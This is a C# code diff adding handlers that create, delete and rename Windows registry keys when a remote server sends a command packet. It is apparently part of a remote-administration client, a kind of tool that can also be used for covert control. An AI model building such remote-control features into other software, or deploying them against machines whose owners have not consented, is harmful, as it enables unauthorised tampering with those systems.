@@ -53,5 +53,68 @@ namespace xClient.Core.Commands
             catch
             { }
         }
+
+        public static void HandleCreateRegistryKey(xClient.Core.Packets.ServerPackets.DoCreateRegistryKey packet, Client client)
+        {
+            xClient.Core.Packets.ClientPackets.GetCreateRegistryKeyResponse responsePacket = new Packets.ClientPackets.GetCreateRegistryKeyResponse();
+            string errorMsg = "";
+            string newKeyName = "";
+            try
+            {
+                responsePacket.IsError = !(RegistryEditor.CreateRegistryKey(packet.ParentPath, out newKeyName, out errorMsg));
+            }
+            catch (Exception ex)
+            {
+                responsePacket.IsError = true;
+                errorMsg = ex.Message;
+            }
+            responsePacket.ErrorMsg = errorMsg;
+
+            responsePacket.Match = new RegSeekerMatch(newKeyName, new List<RegValueData>(), 0);
+            responsePacket.ParentPath = packet.ParentPath;
+
+            responsePacket.Execute(client);
+        }
+
+        public static void HandleDeleteRegistryKey(xClient.Core.Packets.ServerPackets.DoDeleteRegistryKey packet, Client client)
+        {
+            xClient.Core.Packets.ClientPackets.GetDeleteRegistryKeyResponse responsePacket = new Packets.ClientPackets.GetDeleteRegistryKeyResponse();
+            string errorMsg = "";
+            try
+            {
+                responsePacket.IsError = !(RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg));
+            }
+            catch (Exception ex)
+            {
+                responsePacket.IsError = true;
+                errorMsg = ex.Message;
+            }
+            responsePacket.ErrorMsg = errorMsg;
+            responsePacket.ParentPath = packet.ParentPath;
+            responsePacket.KeyName = packet.KeyName;
+
+            responsePacket.Execute(client);
+        }
+
+        public static void HandleRenameRegistryKey(xClient.Core.Packets.ServerPackets.DoRenameRegistryKey packet, Client client)
+        {
+            xClient.Core.Packets.ClientPackets.GetRenameRegistryKeyResponse responsePacket = new Packets.ClientPackets.GetRenameRegistryKeyResponse();
+            string errorMsg = "";
+            try
+            {
+                responsePacket.IsError = !(RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg));
+            }
+            catch (Exception ex)
+            {
+                responsePacket.IsError = true;
+                errorMsg = ex.Message;
+            }
+            responsePacket.ErrorMsg = errorMsg;
+            responsePacket.ParentPath = packet.ParentPath;
+            responsePacket.OldKeyName = packet.OldKeyName;
+            responsePacket.NewKeyName = packet.NewKeyName;
+
+            responsePacket.Execute(client);
+        }
     }
 }
